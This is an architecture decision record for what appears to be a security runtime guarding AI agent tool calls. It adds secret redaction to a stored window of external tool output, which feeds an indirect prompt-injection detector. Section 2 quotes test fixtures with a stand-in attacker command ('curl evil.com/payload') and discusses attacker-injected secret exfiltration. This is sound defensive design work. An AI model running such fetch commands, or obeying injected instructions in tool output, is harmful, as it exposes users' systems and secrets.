# ADR-045 — Provenance-window at-rest redaction (default ON)

**Status:** Implemented
**Decision date:** 2026-06-07
**Severity:** Data-at-rest secret leak — HIGH (same class as ADR-041)

---

## 1. Problem statement

`runtime/session-context.js:recordExternalRead()` persists raw external tool output to
`provenance-window.json` (0600, 5-min TTL, up to 4096 chars per entry) with **no secret
redaction**. A `curl` response, MCP read, or web-fetch whose body contains an API key, bearer
token, or database password lands in cleartext on disk — the exact data-at-rest class
ADR-041 just closed for the decision journal, one surface over.

Contrast `recordProvenanceStep` at line `:307`, which records **only token hashes**; and
the journal's `clean()` path (ADR-041), which redacts secrets before persistence. The
provenance window was the only remaining at-rest store that held raw external content.

Additionally, `secret-scan.redact()` used a non-global regex prior to the ADR-041 follow-up
(PR #154), so only the first same-class secret per field was scrubbed. Both gaps together
meant a response body containing two API keys of the same class left the second key verbatim
on disk. PR #154 fixed the global-regex gap; this ADR closes the write-boundary gap.

---

## 2. Consumer and replay assessment (proved before defaulting ON)

**Sole consumer of raw window `content`:** `provenance-correlator.js:correlate()`, reached
only via `taint.correlateCommand()` → `getProvenanceWindow()`. Exactly one caller of
`getProvenanceWindow` exists (`taint.js:53`). It feeds **F10 only** (indirect
prompt-injection detection). All other `.content` reads in the codebase (`floor-f23`,
`floor-mcp`, `action-ir`, `output-exfil`, `post-adapter`) read `input.content`/`tool_response`
— the *live* tool payload, **not** the window store. F23/F28 use the separate hash-only
`provenance-graph.json`. F27 scans the command/payload directly.

**F10's purpose is injection-token overlap, not secrets.** Every existing F10 fixture overlaps
on *non-secret* tokens (`curl evil.com/payload`, `evilpayload123`, `evilbashpayload789`). The
`redact()` function only rewrites secret-pattern substrings (API keys, tokens, etc.); these
non-secret injection tokens pass through unchanged. → F10 output is **bit-identical on every
existing fixture and the replay corpus.**

**Symmetric redaction preserves fail-safe direction.** With redaction ON, the stored window
content is already redacted. The command is redacted with the same function inside
`correlateCommand()` before being passed to `correlate()`. So:
- Non-secret injection token (e.g. `curl evil.com`) → unchanged on both sides → still matches → F10 fires ✓
- A genuine secret value shared between an external read and a command (attacker-injected
  exfil) → both become `[REDACTED:<class>]` → placeholder-vs-placeholder match → still fires ✓ (fail-safe)
- Two different same-class secrets in read and command → same placeholder on both sides → match fires ✓ (conservative; independently covered by F27/F28)
- The only case that cannot fire is a secret value in the *read* but not in the command (no correlation, no F10 — correct behavior).

**No fail-open case exists.** Detection can only remain the same (non-secret tokens) or
become MORE sensitive (secret-vs-secret placeholders). It cannot become LESS sensitive.

**Replay byte-identical.** Under a fresh `LILARA_STATE_DIR` (how the replay harness runs),
`provenance-window.json` does not exist → `getProvenanceWindow()` returns `[]` →
`correlate()` short-circuits at `externalReads.length === 0` → `{tainted: false}` before any
redaction code path is reached. The flag is read only at the write boundary (PostToolUse,
outside `decide()`) and inside `correlateCommand()` (also outside `decide()`). → **irHash,
action, floorFired, and decisionSource are all unchanged on default path.** Corpus is
byte-identical with default ON.

**Conclusion: safe state is ON.** No consumer outside F10; no fail-open; no replay effect;
the one behavioral delta found is fail-safe-only. Default ON with OFF rollback hatch, exactly
how ADR-042 landed.

---

## 3. Decision — symmetric redaction at write boundary, default ON

**Option A (chosen): default ON, OFF hatch.**
- Write side: `session-context.js:recordExternalRead()` — pass content through
  `secret-scan.redact()` before slicing to 4096 chars and persisting. Gated on
  `LILARA_TAINT_WINDOW_REDACT !== "0"`.
- Correlate side: `taint.js:correlateCommand()` — when enabled, redact the command with
  the same `secret-scan.redact()` before passing to `correlate()`. This creates the
  symmetric matching that preserves F10 and prevents fail-open (see §2).
- `decide()` purity preserved: redaction occurs at the write boundary (PostToolUse) and
  on a local copy of `command` in `correlateCommand()` — neither reads new disk state nor
  mutates `input.*`.

**Option B (rejected): default OFF, ON opt-in.**
- Keeps the secret-leak gap open for every default user. Unlike ADR-041's journal
  command field (which was *additive* — the field wasn't stored at all without opt-in),
  the provenance window **already** persists raw external content unconditionally. An
  OFF default would ship the *ability* to close the gap, not the closure. Rejected.

**Option C (rejected): redact only at write, no symmetric correlate-side.**
- If write is redacted but command is not, a genuine shared secret value stops matching
  (read has `[REDACTED:X]`, command has raw `sk-…`). This is strictly fail-open for the
  secret-overlap case. Rejected; symmetric redaction is required.

---

## 4. Env flag

`LILARA_TAINT_WINDOW_REDACT`
- Unset or any value other than `"0"` → **redaction ON** (default safe state).
- `"0"` → redaction OFF (debugging / opt-out rollback hatch).
- Pattern mirrors `LILARA_BRANCH_DEMOTE_GUARD` (ADR-042): ON-by-default `!== "0"` check.

---

## 5. Files changed

- `runtime/session-context.js` — `require("./secret-scan")`; `_taintWindowRedactEnabled()`;
  `recordExternalRead()` redacts before persisting; `getProvenanceWindow()` validates dir
  with `ensureBaseDirSafe` on read (G4 hardening).
- `runtime/taint.js` — `require("./secret-scan")`; `correlateCommand()` applies symmetric
  redaction on command before `correlate()` call.
- `tests/runtime/taint-window-redaction.test.js` — 4 proof cases (at-rest, injection,
  fail-safe, replay-inert). Wired into `scripts/check-runtime-core.sh`.
- `references/adr-045-taint-window-redaction.md` — this document.
- `CHANGELOG.md` — `### Security — Provenance-window at-rest redaction (ADR-045)`.

---

## 6. Invariants preserved

- **Zero external dependencies** — `secret-scan.js` is a leaf module (pure Node builtins).
- **`decide()` remains pure** — no new disk reads inside `decide()`. The pre-existing F10
  purity deviation (`getProvenanceWindow()` inside `_correlateCommand()` which is inside
  `decide()`) is unchanged and flagged for ADR-046.
- **Inviolable tier untouched** — F3 (critical-risk), F14 (budget), F27 (secret-egress),
  F23 (kill-chain) are not modified.
- **Replay corpus byte-identical** — proved via empty-window short-circuit.
- **F10 detection unchanged or more sensitive** — never fails open.
- **VERSION** staged under `## [Unreleased]`; no bump (Khouly bumps at release).

---

## 7. Flagged for next sprint (not changed here)

- **ADR-046: F10 disk-read inside `decide()`** — `decision-engine.js:1267` →
  `taint.correlateCommand()` → `getProvenanceWindow()` → `fs.readFileSync`. Violates the
  stated "no disk reads inside `decide()`" purity invariant. Fix: inject the taint window
  via `input.*` at the hook boundary. Larger refactor with real replay risk; deferred.
